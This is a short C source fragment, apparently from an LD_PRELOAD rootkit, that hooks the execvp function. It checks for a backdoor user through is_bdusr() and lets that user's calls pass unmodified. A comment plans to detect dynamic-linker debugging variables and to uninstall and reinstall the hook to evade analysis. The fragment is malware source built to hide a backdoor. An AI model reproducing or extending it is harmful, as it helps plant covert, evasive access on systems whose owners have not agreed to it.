int execvp(const char *filename, char *const argv[])
{
    HOOK(o_execvp,CEXECVP);
    if(is_bdusr()) return o_execvp(filename,argv);

    // check for dynamic linker debugging env vars here
    // and uninstall&reinstall
    
    return o_execvp(filename, argv);
}
